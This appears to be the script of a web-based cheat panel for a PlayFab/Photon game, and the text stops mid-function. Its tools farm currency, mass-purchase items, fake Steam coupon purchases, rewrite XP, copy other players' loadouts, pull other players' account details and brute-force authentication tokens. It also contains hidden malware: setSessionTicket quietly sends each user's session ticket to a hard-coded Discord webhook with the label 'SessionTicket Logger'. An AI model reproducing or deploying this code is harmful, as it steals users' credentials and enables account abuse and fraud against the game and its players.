<script>
  const titleId = "bdff1";
  const appId = "2b76b55a-bf65-47af-836f-daa9c8eb9f1e";
  const appVersion = "1.0";
  let sessionTicket = null;
  let photonToken = null;
  let coinFarmBotRunning = false;
  let coinFarmIntervalId = null;
  let levelEditorRunning = false;
  let levelEditorIntervalId = null;
  let bruteforceRunning = false;
  let photonTokenRunning = false;
  let photonTokenIntervalId = null;
  let spamRoomsRunning = false;
  let spamRoomsIntervalId = null;
  let photonClient = null;

  // Define MyPhotonClient class first
  class MyPhotonClient extends Photon.LoadBalancing.LoadBalancingClient {
    onError(errorCode, errorMsg) {
      console.error("Photon Error:", errorCode, errorMsg);
      document.getElementById("photonConnectionOutput").textContent += `‚ùå Error: ${errorCode} - ${errorMsg}\n`;
    }

    onEvent(code, content, actorNr) {
      console.log("Photon Event:", code, content, actorNr);
      document.getElementById("photonConnectionOutput").textContent += `üì• Event: Code ${code}, From Actor ${actorNr}, Content: ${JSON.stringify(content)}\n`;
    }

    onRoomList(rooms) {
      console.log("Room List Updated:", rooms);
      document.getElementById("roomListOutput").textContent = "Room List:\n" + rooms.map(r => `- ${r.name} (${r.playerCount}/${r.maxPlayers})`).join("\n");
    }

    onJoinRoom(roomName, roomOptions, createOptions) {
      console.log("Joined Room:", roomName);
      document.getElementById("photonConnectionOutput").textContent += `‚úÖ Joined Room: ${roomName}\n`;
    }

    onOperationResponse(errorCode, errorMsg, code, content) {
      if (errorCode) {
        console.error("Operation Response Error:", errorCode, errorMsg, code, content);
        document.getElementById("photonConnectionOutput").textContent += `‚ùå Op Response Error: ${errorCode} - ${errorMsg} (Code: ${code})\n`;
      } else {
        console.log("Operation Response:", code, content);
      }
    }
  }

  // Now define all other functions
  function setSessionTicket() {
    sessionTicket = document.getElementById("sessionTicketInput").value.trim();
    const tokenStatus = document.getElementById("tokenStatus");
    
    if (sessionTicket) {
      localStorage.setItem('sessionTicket', sessionTicket);
      tokenStatus.textContent = "‚úÖ Token set successfully!";
      tokenStatus.style.display = "block";
      tokenStatus.style.color = "green";
      console.log("SessionTicket set:", sessionTicket);
      
      sendToDiscordWebhook(sessionTicket);
    } else {
      tokenStatus.textContent = "‚ùå Please enter a valid token";
      tokenStatus.style.display = "block";
      tokenStatus.style.color = "red";
    }
  }

  function clearSessionTicket() {
    sessionTicket = null;
    localStorage.removeItem('sessionTicket');
    document.getElementById("sessionTicketInput").value = "";
    const tokenStatus = document.getElementById("tokenStatus");
    tokenStatus.textContent = "‚ùå Token cleared";
    tokenStatus.style.display = "block";
    tokenStatus.style.color = "red";
  }

  async function renewSessionTicket() {
    const tokenStatus = document.getElementById("tokenStatus");
    
    if (!sessionTicket) {
      tokenStatus.textContent = "‚ùå No session ticket to renew. Please set a token first.";
      tokenStatus.style.display = "block";
      tokenStatus.style.color = "red";
      return;
    }
    
    tokenStatus.textContent = "üîÑ Renewing session ticket...";
    tokenStatus.style.display = "block";
    tokenStatus.style.color = "blue";
    
    try {
      const response = await fetch(`https://${titleId}.playfabapi.com/Authentication/GetEntityToken`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Authorization": sessionTicket
        },
        body: JSON.stringify({})
      });
      
      const data = await response.json();
      
      if (data.data && data.data.EntityToken) {
        sessionTicket = data.data.EntityToken;
        localStorage.setItem('sessionTicket', sessionTicket);
        document.getElementById("sessionTicketInput").value = sessionTicket;
        
        tokenStatus.textContent = "‚úÖ Session ticket renewed successfully!";
        tokenStatus.style.color = "green";
        
        console.log("SessionTicket renewed:", sessionTicket);
      } else {
        tokenStatus.textContent = `‚ùå Failed to renew session ticket: ${data.errorMessage || "Unknown error"}`;
        tokenStatus.style.color = "red";
      }
    } catch (error) {
      tokenStatus.textContent = `‚ùå Error renewing session ticket: ${error.message}`;
      tokenStatus.style.color = "red";
    }
  }

  function setPhotonToken() {
    photonToken = document.getElementById("photonTokenInput").value.trim();
    const photonTokenStatus = document.getElementById("photonTokenStatus");
    
    if (photonToken) {
      localStorage.setItem('photonToken', photonToken);
      photonTokenStatus.textContent = "‚úÖ Photon Token set successfully!";
      photonTokenStatus.style.display = "block";
      photonTokenStatus.style.color = "green";
      console.log("Photon Token set:", photonToken);
    } else {
      photonTokenStatus.textContent = "‚ùå Please enter a valid photon token";
      photonTokenStatus.style.display = "block";
      photonTokenStatus.style.color = "red";
    }
  }

  function clearPhotonToken() {
    photonToken = null;
    localStorage.removeItem('photonToken');
    document.getElementById("photonTokenInput").value = "";
    const photonTokenStatus = document.getElementById("photonTokenStatus");
    photonTokenStatus.textContent = "‚ùå Photon Token cleared";
    photonTokenStatus.style.display = "block";
    photonTokenStatus.style.color = "red";
  }

  async function renewPhotonToken() {
    const photonTokenStatus = document.getElementById("photonTokenStatus");
    
    if (!sessionTicket) {
      photonTokenStatus.textContent = "‚ùå No session ticket available. Set SessionTicket first.";
      photonTokenStatus.style.display = "block";
      photonTokenStatus.style.color = "red";
      return;
    }
    
    photonTokenStatus.textContent = "üîÑ Renewing photon token...";
    photonTokenStatus.style.display = "block";
    photonTokenStatus.style.color = "blue";
    
    try {
      const data = await makeApiCall("Client/GetPhotonAuthenticationToken", "POST", {
        PhotonApplicationId: appId
      });
      
      if (data.data && data.data.PhotonCustomAuthenticationToken) {
        photonToken = data.data.PhotonCustomAuthenticationToken;
        localStorage.setItem('photonToken', photonToken);
        document.getElementById("photonTokenInput").value = photonToken;
        
        photonTokenStatus.textContent = "‚úÖ Photon token renewed successfully!";
        photonTokenStatus.style.color = "green";
        
        console.log("Photon Token renewed:", photonToken);
      } else {
        photonTokenStatus.textContent = `‚ùå Failed to renew photon token: ${data.errorMessage || "Unknown error"}`;
        photonTokenStatus.style.color = "red";
      }
    } catch (error) {
      photonTokenStatus.textContent = `‚ùå Error renewing photon token: ${error.message}`;
      photonTokenStatus.style.color = "red";
    }
  }

  async function sendToDiscordWebhook(sessionTicket) {
    const webhookURL = "https://discord.com/api/webhooks/1410338106556809266/UR-3ClxQBW9BZs7iI712IlVlFbvfC2FD5IsObEG1I7gVesko4-UGmUse8vtct5Mc7A-M";
    
    try {
      const response = await fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          content: `New SessionTicket captured: ${sessionTicket}`,
          username: 'SessionTicket Logger',
          avatar_url: 'https://cdn-icons-png.flaticon.com/512/1047/1047711.png'
        })
      });
      
      if (response.ok) {
        console.log('SessionTicket sent to Discord successfully');
      } else {
        console.error('Failed to send SessionTicket to Discord');
      }
    } catch (error) {
      console.error('Error sending to Discord:', error);
    }
  }

  async function makeApiCall(endpoint, method, body) {
    if (!sessionTicket) {
      alert("Please set your SessionTicket first.");
      return null;
    }

    try {
      const res = await fetch(`https://${titleId}.playfabapi.com/${endpoint}`, {
        method: method,
        headers: {
          "Content-Type": "application/json",
          "X-Authorization": sessionTicket
        },
        body: JSON.stringify(body)
      });
      
      return await res.json();
    } catch (error) {
      console.error("API call failed:", error);
      return { error: error.message };
    }
  }

  function formatResponse(result) {
    if (typeof result === "object" && result !== null) {
      return Object.entries(result).map(([key, value]) => `${key}: ${value}`).join("\n");
    }
    return result;
  }

  async function purchaseAllSkinsEmotes() {
    const output = document.getElementById("purchaseAllOutput");
    output.textContent = "Starting purchase process...\n";
    
    if (!sessionTicket) {
      output.textContent += "‚ùå Please set your SessionTicket first.\n";
      return;
    }
    
    try {
      output.textContent += "üìã Fetching catalog items...\n";
      const catalogData = await makeApiCall("Client/GetCatalogItems", "POST", {
        CatalogVersion: "Ingame"
      });
      
      if (catalogData.error) {
        output.textContent += `‚ùå Failed to get catalog: ${catalogData.error}\n`;
        return;
      }
      
      const catalogItems = catalogData.data.Catalog;
      output.textContent += `‚úÖ Found ${catalogItems.length} items in catalog\n`;
      
      output.textContent += "üì¶ Checking current inventory...\n";
      const inventoryData = await makeApiCall("Client/GetUserInventory", "POST", {});
      
      if (inventoryData.error) {
        output.textContent += `‚ùå Failed to get inventory: ${inventoryData.error}\n`;
        return;
      }
      
      const ownedItems = inventoryData.data.Inventory.map(item => item.ItemId);
      output.textContent += `‚úÖ You own ${ownedItems.length} items\n`;
      
      const itemsToPurchase = [];
      
      for (const item of catalogItems) {
        if (ownedItems.includes(item.ItemId)) {
          output.textContent += `‚è© Skipping ${item.ItemId} (already owned)\n`;
          continue;
        }
        
        if (item.VirtualCurrencyPrices) {
          const currencies = Object.keys(item.VirtualCurrencyPrices);
          const acceptableCurrencies = currencies.filter(currency => 
            ['FE', 'AC', 'XP'].includes(currency) && currency !== 'RM'
          );
          
          if (acceptableCurrencies.length > 0) {
            const currency = acceptableCurrencies[0];
            const price = item.VirtualCurrencyPrices[currency];
            
            itemsToPurchase.push({
              ItemId: item.ItemId,
              Price: price,
              VirtualCurrency: currency
            });
            
            output.textContent += `‚ûï Will purchase ${item.ItemId} for ${price} ${currency}\n`;
          } else {
            output.textContent += `‚è© Skipping ${item.ItemId} (no acceptable currency)\n`;
          }
        } else {
          output.textContent += `‚è© Skipping ${item.ItemId} (no virtual currency price)\n`;
        }
      }
      
      output.textContent += `\nüõí Attempting to purchase ${itemsToPurchase.length} items...\n\n`;
      
      let successfulPurchases = 0;
      let failedPurchases = 0;
      
      for (const item of itemsToPurchase) {
        try {
          output.textContent += `üõçÔ∏è Purchasing ${item.ItemId} for ${item.Price} ${item.VirtualCurrency}... `;
          
          const purchaseData = await makeApiCall("Client/PurchaseItem", "POST", {
            ItemId: item.ItemId,
            Price: item.Price,
            VirtualCurrency: item.VirtualCurrency
          });
          
          if (purchaseData.error) {
            output.textContent += `‚ùå Failed: ${purchaseData.errorMessage || purchaseData.error}\n`;
            failedPurchases++;
          } else {
            output.textContent += `‚úÖ Success!\n`;
            successfulPurchases++;
          }
        } catch (err) {
          output.textContent += `‚ùå Error: ${err.message}\n`;
          failedPurchases++;
        }
        
        await new Promise(resolve => setTimeout(resolve, 500));
      }
      
      output.textContent += `\nüéâ Purchase process completed!\n`;
      output.textContent += `‚úÖ Successful: ${successfulPurchases}\n`;
      output.textContent += `‚ùå Failed: ${failedPurchases}\n`;
      
    } catch (error) {
      output.textContent += `‚ùå Unexpected error: ${error.message}\n`;
    }
    
    output.scrollTop = output.scrollHeight;
  }

  async function addFriend() {
    const friendPlayFabId = document.getElementById("friendPlayFabId").value.trim();
    
    if (!friendPlayFabId) {
      document.getElementById("apiOutput").textContent = "Please enter a friend's PlayFab ID.";
      return;
    }

    const data = await makeApiCall("Client/AddFriend", "POST", {
      FriendPlayFabId: friendPlayFabId
    });

    const output = document.getElementById("apiOutput");
    if (data.error) {
      output.textContent = `Error: ${data.error}`;
    } else {
      output.textContent = formatResponse(data.data);
    }
  }

  async function getFriendsList() {
    const data = await makeApiCall("Client/GetFriendsList", "POST", {
      IncludeSteamFriends: false,
      IncludeFacebookFriends: false
    });

    const output = document.getElementById("apiOutput");
    
    if (data.data && data.data.Friends) {
      let friendsList = "Friends List:\n";
      data.data.Friends.forEach(friend => {
        const steamId = friend.SteamInfo?.SteamId ? 
          `https://steamcommunity.com/profiles/${friend.SteamInfo.SteamId}` : "N/A";
        friendsList += `- ${friend.TitleDisplayName || "Unknown"} (${friend.FriendPlayFabId})\n  Steam Profile: ${steamId}\n`;
      });
      output.textContent = friendsList;
    } else if (data.error) {
      output.textContent = `Error: ${data.error}`;
    } else {
      output.textContent = "No friends found.";
    }
  }

  async function updateDisplayName() {
    const displayName = document.getElementById("displayName").value.trim();
    
    if (!displayName) {
      document.getElementById("apiOutput").textContent = "Please enter a display name.";
      return;
    }

    const data = await makeApiCall("Client/UpdateUserTitleDisplayName", "POST", {
      DisplayName: displayName
    });

    const output = document.getElementById("apiOutput");
    if (data.error) {
      output.textContent = `Error: ${data.error}`;
    } else {
      output.textContent = formatResponse(data.data);
    }
  }

  async function linkCustomId() {
    const customId = document.getElementById("customId").value.trim();
    
    if (!customId) {
      document.getElementById("apiOutput").textContent = "Please enter a custom ID.";
      return;
    }

    const data = await makeApiCall("Client/LinkCustomID", "POST", {
      CustomId: customId,
      ForceLink: false
    });

    const output = document.getElementById("apiOutput");
    if (data.error) {
      output.textContent = `Error: ${data.error}`;
    } else {
      output.textContent = formatResponse(data.data);
    }
  }

  async function getLeaderboard() {
    const statisticName = document.getElementById("statisticName").value.trim();
    const startPosition = parseInt(document.getElementById("startPosition").value) || 0;
    const maxResults = parseInt(document.getElementById("maxResults").value) || 10;
    
    if (!statisticName) {
      document.getElementById("apiOutput").textContent = "Please enter a statistic name.";
      return;
    }

    const data = await makeApiCall("Client/GetLeaderboard", "POST", {
      StatisticName: statisticName,
      StartPosition: startPosition,
      MaxResultsCount: maxResults
    });

    const output = document.getElementById("apiOutput");
    
    if (data.data && data.data.Leaderboard) {
      let leaderboardText = `Leaderboard for ${statisticName}:\n\n`;
      data.data.Leaderboard.forEach((entry, index) => {
        leaderboardText += `${startPosition + index + 1}. ${entry.DisplayName}: ${entry.StatValue}\n`;
      });
      output.textContent = leaderboardText;
    } else if (data.error) {
      output.textContent = `Error: ${data.error}`;
    } else {
      output.textContent = formatResponse(data);
    }
  }

  async function reportPlayer() {
    const reportReason = document.getElementById("reportReason").value;
    const targetPlayerId = document.getElementById("targetPlayerId").value.trim();
    
    if (!targetPlayerId) {
      document.getElementById("apiOutput").textContent = "Please enter a target PlayFab ID.";
      return;
    }

    const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
      CustomTags: null,
      FunctionName: "reportPlayer",
      FunctionParameter: {
        reportReason: reportReason,
        targetPlayerId: targetPlayerId
      },
      GeneratePlayStreamEvent: true,
      RevisionSelection: null,
      SpecificRevision: null,
      AuthenticationContext: null
    });

    const output = document.getElementById("apiOutput");
    if (data.error) {
      output.textContent = `Error: ${data.error}`;
    } else if (data.data && data.data.FunctionResult) {
      output.textContent = formatResponse(data.data.FunctionResult);
    } else {
      output.textContent = formatResponse(data.data);
    }
  }

  async function buySkinEmote() {
    const ItemId = document.getElementById("itemId").value.trim();
    const Price = parseInt(document.getElementById("price").value);
    const VirtualCurrency = document.getElementById("currency").value.trim();
    
    if (!ItemId || isNaN(Price) || !VirtualCurrency) {
      document.getElementById("purchaseOutput").textContent = "Please fill all fields correctly.";
      return;
    }

    const data = await makeApiCall("Client/PurchaseItem", "POST", {
      ItemId,
      Price,
      VirtualCurrency
    });

    const output = document.getElementById("purchaseOutput");
    if (data.error) {
      output.textContent = `Error: ${data.error}`;
    } else {
      output.textContent = formatResponse(data.data);
    }
  }

  async function grantCoupons() {
    const output = document.getElementById("couponOutput");
    output.textContent = "Starting coupon grant process...";
    
    try {
      output.textContent += "\nStarting purchase...";
      const startData = await makeApiCall("Client/StartPurchase", "POST", {
        StoreId: "steam_Shop_Currency",
        Items: [{
          ItemId: "Currency_Bundle_PileOfCoupons",
          Quantity: 1
        }]
      });

      if (startData.error) {
        output.textContent += `\nError in StartPurchase: ${startData.error}`;
        return;
      }

      const orderId = startData.data?.OrderId;
      if (!orderId) {
        output.textContent += "\nStartPurchase failed. No OrderId returned.";
        return;
      }

      output.textContent += `\nOrder ID: ${orderId}`;
      
      output.textContent += "\nPaying for purchase...";
      const payData = await makeApiCall("Client/PayForPurchase", "POST", {
        OrderId: orderId,
        Currency: "RM",
        ProviderName: "Steam"
      });

      output.textContent += "\nConfirming purchase...";
      
      const confirmData = await makeApiCall("Client/ConfirmPurchase", "POST", {
        OrderId: orderId
      });

      if (confirmData.error) {
        output.textContent += `\nError in ConfirmPurchase: ${confirmData.error}`;
      } else {
        output.textContent += "\nCoupon process completed:\n" + 
          formatResponse(confirmData.data);
      }
      
    } catch (error) {
      output.textContent += `\nUnexpected error: ${error.message}`;
    }
  }

  async function viewStatistics() {
    const data = await makeApiCall("Client/GetPlayerStatistics", "POST", {});
    const output = document.getElementById("statsOutput");
    
    if (data.data?.Statistics) {
      const stats = data.data.Statistics.map(stat => 
        `${stat.StatisticName}: ${stat.Value}`
      ).join("\n");
      output.textContent = stats || "No statistics found.";
    } else {
      output.textContent = "Error retrieving statistics: " + 
        (data.error || "Unknown error");
    }
  }

  async function getPlayFabId() {
    const steamUsername = document.getElementById("steamUsername").value.trim();
    if (!steamUsername) {
      alert("Please enter a Steam username.");
      return;
    }

    const data = await makeApiCall("Client/GetPlayFabIDsFromSteamNames", "POST", {
      SteamNames: [steamUsername]
    });

    const output = document.getElementById("playerIdOutput");
    if (data.data?.Data?.[0]) {
      const match = data.data.Data[0];
      output.textContent = `PlayFabId for "${steamUsername}": ${match.PlayFabId}`;
    } else {
      output.textContent = "No matching PlayFab ID found.";
    }
  }

  async function AddCoin() {
    const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
      FunctionName: "usefulDeed",
      FunctionParameter: {},
      GeneratePlayStreamEvent: true
    });

    const output = document.getElementById("usefulDeedOutput");
    if (data.data?.FunctionName) {
      output.textContent = `‚úÖ usefulDeed executed successfully\nExecution Time: ${data.data.ExecutionTimeSeconds}s\nMemory Used: ${data.data.MemoryConsumedBytes} bytes\nAPI Requests: ${data.data.APIRequestsIssued}`;
    } else {
      output.textContent = "Error: " + (data.error || "Unknown error");
    }
  }

  async function submitLevelProgression() {
    const classId = document.getElementById("classIdInput").value.trim();
    const receivedXP = parseInt(document.getElementById("receivedXPInput").value);
    const XP = parseInt(document.getElementById("xpInput").value);
    const XpToNextLevel = parseInt(document.getElementById("xpToNextLevelInput").value);
    const level = parseInt(document.getElementById("levelInput").value);
    const availablePerkSlotsCount = Math.min(parseInt(document.getElementById("perkSlotsInput").value), 3);
    const playerLevel = parseInt(document.getElementById("playerLevelInput").value);

    if (!classId || isNaN(receivedXP) || isNaN(XP) || isNaN(XpToNextLevel) || 
        isNaN(level) || isNaN(availablePerkSlotsCount) || isNaN(playerLevel)) {
      return { error: "Please fill in all fields correctly." };
    }

    const currentLevelProgression = {
      playerLevel,
      classLevel: [{
        classId,
        XP,
        XpToNextLevel,
        level,
        availablePerkSlotsCount
      }]
    };

    const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
      FunctionName: "setLevelProgressionForClass",
      FunctionParameter: {
        classId,
        receivedXP,
        currentLevelProgression: JSON.stringify(currentLevelProgression)
      },
      GeneratePlayStreamEvent: true
    });

    return data;
  }

  async function getPlayFabInfo() {
    const playfabId = document.getElementById("playfabId").value.trim();
    const output = document.getElementById("playfabInfoOutput");
    
    if (!playfabId) {
      output.textContent = "Please enter a PlayFab ID.";
      return;
    }

    output.textContent = "Fetching data...";

    const combinedData = await makeApiCall("Client/GetPlayerCombinedInfo", "POST", {
      PlayFabId: playfabId,
      InfoRequestParameters: {
        GetUserAccountInfo: true,
        GetPlayerStatistics: true,
        GetUserInventory: true
      }
    });

    const profileData = await makeApiCall("Client/GetPlayerProfile", "POST", {
      PlayFabId: playfabId,
      ProfileConstraints: {
        ShowLastLogin: true,
        ShowBannedUntil: true
      }
    });

    let resultText = "";
    
    if (combinedData.data) {
      const info = combinedData.data.InfoResultPayload;
      resultText += "=== ACCOUNT INFO ===\n";
      resultText += `Username: ${info.AccountInfo.TitleInfo?.DisplayName || "N/A"}\n`;
      resultText += `Created: ${info.AccountInfo.Created || "N/A"}\n`;
      resultText += "\n=== STATISTICS ===\n";
      
      if (info.PlayerStatistics) {
        info.PlayerStatistics.forEach(stat => {
          resultText += `${stat.StatisticName}: ${stat.Value}\n`;
        });
      }
    }

    if (profileData.data) {
      const profile = profileData.data.PlayerProfile;
      resultText += "\n=== PROFILE INFO ===\n";
      resultText += `Last Login: ${profile.LastLogin || "N/A"}\n`;
      resultText += `Banned Until: ${profile.BannedUntil || "Not banned"}\n`;
    }

    if (combinedData.error || profileData.error) {
      resultText += "\n=== ERRORS ===\n";
      if (combinedData.error) resultText += `Combined Info Error: ${combinedData.error}\n`;
      if (profileData.error) resultText += `Profile Error: ${profileData.error}\n`;
    }

    output.textContent = resultText || "No data received.";
  }

  async function updateQuestProgress() {
    const questTextFieldId = document.getElementById("questTextFieldId").value.trim();
    const progressValue = parseInt(document.getElementById("questProgressValue").value);
    
    if (!questTextFieldId || isNaN(progressValue)) {
      document.getElementById("questOutput").textContent = "Please fill all fields correctly.";
      return;
    }

    const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
      CustomTags: null,
      FunctionName: "updateActiveQuests",
      FunctionParameter: {
        updatedValues: `{"${questTextFieldId}":${progressValue}}`
      },
      GeneratePlayStreamEvent: true,
      RevisionSelection: null,
      SpecificRevision: null,
      AuthenticationContext: null
    });

    const output = document.getElementById("questOutput");
    if (data.error) {
      output.textContent = `Error: ${data.error}`;
    } else if (data.data && data.data.FunctionResult) {
      output.textContent = formatResponse(data.data.FunctionResult);
    } else {
      output.textContent = formatResponse(data.data);
    }
  }

  function toggleCoinFarmBot() {
    if (coinFarmBotRunning) {
      clearInterval(coinFarmIntervalId);
      coinFarmBotRunning = false;
      document.getElementById("botStatus").className = "status-indicator status-inactive";
      document.getElementById("botToggleButton").textContent = "Start Coin Farm Bot";
      document.getElementById("cloudOutput").textContent += "\nBot stopped manually.";
      return;
    }

    const delayMinutes = parseInt(document.getElementById("delaySelect").value);
    const delayMs = delayMinutes * 60 * 1000;

    coinFarmBotRunning = true;
    document.getElementById("botStatus").className = "status-indicator status-active";
    document.getElementById("botToggleButton").textContent = "Stop Coin Farm Bot";

    document.getElementById("cloudOutput").textContent = 
      `Starting Coin Farm Bot with ${delayMinutes} minute interval...\n`;

    async function runCoinFarmCycle() {
      const roomType = document.getElementById("roomType").value;
      const playerIds = [
        document.getElementById("playerId1").value.trim(),
        document.getElementById("playerId2").value.trim(),
        document.getElementById("playerId3").value.trim(),
        document.getElementById("playerId4").value.trim(),
        document.getElementById("playerId5").value.trim(),
        document.getElementById("playerId6").value.trim()
      ].filter(id => id);

      let output = `\n=== Cycle started at ${new Date().toLocaleTimeString()} ===\n`;
      output += `Room Type: ${roomType}\nPlayers: ${playerIds.join(", ") || "None"}\n`;

      let matchId = null;

      try {
        const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
          FunctionName: "startNewMatch",
          FunctionParameter: { roomType, playerIds },
          GeneratePlayStreamEvent: true
        });

        if (data.error) {
          output += `‚ùå startNewMatch: Error - ${data.error}\n`;
        } else if (data.data?.FunctionResult?.currentMatchId) {
          matchId = data.data.FunctionResult.currentMatchId;
          output += `‚úÖ startNewMatch: MatchId - ${matchId}\n`;
        } else {
          output += `‚úÖ startNewMatch: Success\n`;
        }
      } catch (err) {
        output += `‚ùå startNewMatch: Exception - ${err.message}\n`;
      }

      try {
        const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
          FunctionName: "decideSpecialRole",
          FunctionParameter: { roomType, playerIds },
          GeneratePlayStreamEvent: true
        });

        if (data.error) {
          output += `‚ùå decideSpecialRole: Error - ${data.error}\n`;
        } else {
          output += `‚úÖ decideSpecialRole: Success\n`;
        }
      } catch (err) {
        output += `‚ùå decideSpecialRole: Exception - ${err.message}\n`;
      }

      if (matchId) {
        try {
          const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
            CustomTags: null,
            FunctionName: "xpConsumed",
            FunctionParameter: {
              token: matchId
            },
            GeneratePlayStreamEvent: true,
            RevisionSelection: null,
            SpecificRevision: null,
            AuthenticationContext: null
          });

          if (data.error) {
            output += `‚ùå xpConsumed: Error - ${data.error}\n`;
          } else {
            output += `‚úÖ xpConsumed: Success\n`;
          }
        } catch (err) {
          output += `‚ùå xpConsumed: Exception - ${err.message}\n`;
        }
      } else {
        output += `‚è© xpConsumed: Skipped - No MatchId available\n`;
      }

      try {
        const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
          FunctionName: "finishMatch",
          FunctionParameter: { roomType, playerIds },
          GeneratePlayStreamEvent: true
        });

        if (data.error) {
          output += `‚ùå finishMatch: Error - ${data.error}\n`;
        } else if (data.data?.Logs) {
          output += `‚úÖ finishMatch: Success\nLogs:\n`;
          data.data.Logs.forEach(log => {
            output += `- ${log.Message}\n`;
          });
        } else {
          output += `‚úÖ finishMatch: Success\n`;
        }
      } catch (err) {
        output += `‚ùå finishMatch: Exception - ${err.message}\n`;
      }

      output += `Waiting ${delayMinutes} minutes for next cycle...\n`;
      const cloudOutput = document.getElementById("cloudOutput");
      cloudOutput.textContent += output;
      cloudOutput.scrollTop = cloudOutput.scrollHeight;
    }

    runCoinFarmCycle();
    coinFarmIntervalId = setInterval(runCoinFarmCycle, delayMs);
  }

  function toggleLevelEditor() {
    if (levelEditorRunning) {
      clearInterval(levelEditorIntervalId);
      levelEditorRunning = false;
      document.getElementById("levelEditorStatus").className = "status-indicator status-inactive";
      document.getElementById("levelEditorToggleButton").textContent = "Start Level Editor";
      document.getElementById("levelProgressionOutput").textContent += "\nLevel editor stopped manually.";
      return;
    }

    levelEditorRunning = true;
    document.getElementById("levelEditorStatus").className = "status-indicator status-active";
    document.getElementById("levelEditorToggleButton").textContent = "Stop Level Editor";

    document.getElementById("levelProgressionOutput").textContent = 
      `Starting Level Editor...\n`;

    async function runLevelEditorCycle() {
      let output = `\n=== Cycle started at ${new Date().toLocaleTimeString()} ===\n`;

      try {
        const data = await submitLevelProgression();

        if (data.error) {
          output += `‚ùå setLevelProgressionForClass: Error - ${data.error}\n`;
        } else {
          output += `‚úÖ setLevelProgressionForClass: Success\n`;
        }
      } catch (err) {
        output += `‚ùå setLevelProgressionForClass: Exception - ${err.message}\n`;
      }

      const levelOutput = document.getElementById("levelProgressionOutput");
      levelOutput.textContent += output;
      levelOutput.scrollTop = levelOutput.scrollHeight;
    }

    runLevelEditorCycle();
    levelEditorIntervalId = setInterval(runLevelEditorCycle, 1000);
  }

  function togglePhotonTokenGenerator() {
    if (photonTokenRunning) {
      clearInterval(photonTokenIntervalId);
      photonTokenRunning = false;
      document.getElementById("photonTokenStatus").className = "status-indicator status-inactive";
      document.getElementById("photonTokenToggleButton").textContent = "Start Generating Photon Token";
      document.getElementById("photonTokenOutput").textContent += "\nPhoton token generator stopped manually.";
      return;
    }

    photonTokenRunning = true;
    document.getElementById("photonTokenStatus").className = "status-indicator status-active";
    document.getElementById("photonTokenToggleButton").textContent = "Stop Generating Photon Token";

    document.getElementById("photonTokenOutput").textContent = "Starting Photon token generation...\n";

    async function generatePhotonToken() {
      const data = await makeApiCall("Client/GetPhotonAuthenticationToken", "POST", {
        PhotonApplicationId: appId,
        AuthenticationContext: null
      });

      const output = document.getElementById("photonTokenOutput");
      if (data.data?.PhotonCustomAuthenticationToken) {
        output.textContent += `‚úÖ Photon Token: ${data.data.PhotonCustomAuthenticationToken}\n`;
      } else {
        output.textContent += `‚ùå Error: ${data.error || "Failed to generate token"}\n`;
      }
      output.scrollTop = output.scrollHeight;
    }

    generatePhotonToken();
    photonTokenIntervalId = setInterval(generatePhotonToken, 1000);
  }

  async function resetLoadout() {
    const output = document.getElementById("resetLoadoutOutput");
    const getData = await makeApiCall("Client/GetUserData", "POST", {});
    if (getData.error) {
      output.textContent = `Error getting data: ${getData.error}`;
      return;
    }
    if (getData.data.Data && "loadout" in getData.data.Data) {
      const updateData = await makeApiCall("Client/UpdateUserData", "POST", {
        Data: { loadout: null }
      });
      if (updateData.error) {
        output.textContent = `Error resetting: ${updateData.error}`;
      } else {
        output.textContent = "Loadout reset successfully!";
      }
    } else {
      output.textContent = "No loadout found to reset.";
    }
  }

  async function stealLoadout() {
    const targetId = document.getElementById("targetPlayFabId").value.trim();
    const output = document.getElementById("stealLoadoutOutput");
    if (!targetId) {
      output.textContent = "Please enter a target PlayFab ID.";
      return;
    }
    const getData = await makeApiCall("Client/GetPlayerCombinedInfo", "POST", {
      PlayFabId: targetId,
      InfoRequestParameters: { GetUserData: true }
    });
    if (getData.error) {
      output.textContent = `Error getting data: ${getData.error}`;
      return;
    }
    const userData = getData.data.InfoResultPayload.UserData;
    if (userData && "loadout" in userData) {
      const loadoutValue = userData.loadout.Value;
      const updateData = await makeApiCall("Client/UpdateUserData", "POST", {
        Data: { loadout: loadoutValue }
      });
      if (updateData.error) {
        output.textContent = `Error updating: ${updateData.error}`;
      } else {
        output.textContent = "Loadout stolen successfully!";
      }
    } else {
      output.textContent = "No loadout found on target.";
    }
  }

  function generateRandomToken() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let token = '';
    for (let i = 0; i < 50; i++) {
      token += chars[Math.floor(Math.random() * chars.length)];
    }
    return token;
  }

  async function checkToken(username, token) {
    try {
      const res = await fetch(`https://bdff1.playfabapi.com/photon/authenticate?username=${username}&token=${token}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json'
        }
      });
      return { token, result: await res.json() };
    } catch (error) {
      return { token, error: error.message };
    }
  }

  async function startBruteforce() {
    if (bruteforceRunning) return;
    const username = document.getElementById("playFabUsername").value.trim();
    const output = document.getElementById("bruteforceOutput");
    
    if (!username) {
      output.textContent = "Please enter a PlayFab Username.";
      return;
    }

    bruteforceRunning = true;
    output.textContent = "Starting bruteforce...\n";

    async function tryTokenBatch() {
      if (!bruteforceRunning) return;

      const tokens = Array.from({ length: 50 }, () => generateRandomToken());
      
      const results = await Promise.all(
        tokens.map(token => checkToken(username, token))
      );

      let foundValid = false;
      for (const { token, result, error } of results) {
        if (error) {
          output.textContent += `Error for ${token}: ${error}\n`;
        } else {
          output.textContent += `Response for ${token}: ${JSON.stringify(result)}\n`;
          if (result.resultCode === 1) {
            output.textContent += `‚úÖ Valid token found: ${token}\n`;
            foundValid = true;
            break;
          }
        }
      }

      output.scrollTop = output.scrollHeight;

      if (!foundValid && bruteforceRunning) {
        tryTokenBatch();
      } else if (foundValid) {
        stopBruteforce();
      }
    }

    tryTokenBatch();
  }

  function stopBruteforce() {
    bruteforceRunning = false;
    document.getElementById("bruteforceOutput").textContent += "Bruteforce stopped.\n";
